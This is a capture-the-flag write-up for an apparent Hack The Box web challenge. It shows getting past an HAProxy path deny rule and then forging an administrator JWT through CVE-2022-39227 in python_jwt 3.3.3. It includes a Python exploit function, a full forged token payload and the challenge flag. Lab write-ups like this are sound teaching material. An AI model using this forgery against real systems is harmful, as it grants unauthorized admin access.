# Challenge source file
URL: [https://1drv.ms/u/c/4ab09e7ce6bb4141/EdYr-ieqp41DvNLm6nxFQ9QBmHrbVUcS8ikaqq513BCD7g?e=uxOHd4](https://1drv.ms/u/c/4ab09e7ce6bb4141/EdYr-ieqp41DvNLm6nxFQ9QBmHrbVUcS8ikaqq513BCD7g?e=uxOHd4)

# Difficulty
Normal

# Author
Hack The Box team

# Approach
- The site is an API that provide chat service between companies and ransomware groups. It provides 3 endpoints: an endpoint to get chat ticket, an endpoint to read the chat, and one is for the flag:
  ![image](https://github.com/NoSpaceAvailable/HackTheBox-Cyber-Apocalypse-CTF-2024/assets/143888307/4294e8ed-8b6a-48ba-90b0-2220529f2e09)

- The problem is: I can't use any service on it, because it requires a valid JWT token provided by backend, and the endpoint */api/v1/get_ticket* was banned.
- It's time to read the source code:
- *haproxy.cfg* file:
```
global
    daemon
    maxconn 256

defaults
    mode http

    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms

frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
    
backend backend
    balance roundrobin
    server s1 0.0.0.0:5000 maxconn 32 check
```

- This is a config file that have the rule to prevent us from accessing */api/v1/get_ticket*. This can be easily bypassed using [CVE-2023-45539](https://www.haproxy.com/blog/december-2023-cve-2023-45539-haproxy-accepts-as-part-of-the-uri-component-fixed), but I used another technique:
  ![image](https://github.com/NoSpaceAvailable/HackTheBox-Cyber-Apocalypse-CTF-2024/assets/143888307/0d01a026-f374-434d-9ea7-5f19827e6f5a)
 
- I have a JWT token now. I put it in an online decoder, and receive this:
  ![image](https://github.com/NoSpaceAvailable/HackTheBox-Cyber-Apocalypse-CTF-2024/assets/143888307/ce289f92-60ee-4d39-b48f-e2cd6e490a02)

- We can see that there is a guest role assigned to this token, so the goal is change it to admin role.
- The backend also use a module called *python-jwt*:
*requirements.txt*:
  ```
  uwsgi
  Flask
  requests
  python_jwt==3.3.3
  ```

- This version has a vulnerability explained in [CVE-2022-39227](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-39227). Luckily, there is an available [POC](https://github.com/user0x1337/CVE-2022-39227) that I can use. Or you can use this script to create a fake JWT:
  ```python
  def exp(token):
    [header, payload, signature] = token.split(".")
    parsed_payload = loads(base64url_decode(payload))
    parsed_payload["role"] = "administrator"
    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',',':'))))

    return '{" ' + header + '.'+ fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
  ```
  

# Problem-solving
- I created a fake JWT (actually, this is not JWT anymore), then use it to access */api/v1/flag*:
  ```
  {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTE3MDM4ODEsImlhdCI6MTcxMTcwMDI4MSwianRpIjoic0hlMmZyZ2dqTV9rajFDaHo1bGJfdyIsIm5iZiI6MTcxMTcwMDI4MSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiaGVoZSJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTE3MDM4ODEsImlhdCI6MTcxMTcwMDI4MSwianRpIjoic0hlMmZyZ2dqTV9rajFDaHo1bGJfdyIsIm5iZiI6MTcxMTcwMDI4MSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"i0y3hv69ciWMFSFLrxS7qL53jqdaW0-xNkezPO-gBlZlfEZ7EKp6vAYwMmb2NDqadA8uqBepYgQ7dDK_5vqLh06Xr1IvVFqdCmmu62wKsvGJg1spsIRMIq-9f4fR_I0lENSeqVnPAbEuLCVf2wU-b9Kji6V3APCRNWkMJ_r9sJi9cnz4_NNtX_NoOMd2UJCp_JSRMXPh31YXUswmKdJl1lxpbUQvk7ya000yLMQG6CzzdTFK45mwV-4OL6-yYA8a8kj3wnwAMiUL0YLG3zhShm3wBjuULwThcsymwCjY_6eTbi7d4yMQcO8Y1i5N1l91n366Sa0C0_V5OY8IsRE3Ag"}
  ```
  ![image](https://github.com/NoSpaceAvailable/HackTheBox-Cyber-Apocalypse-CTF-2024/assets/143888307/49f9c7f6-6489-4a3c-9739-176319dcd235)

- Flag: HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}
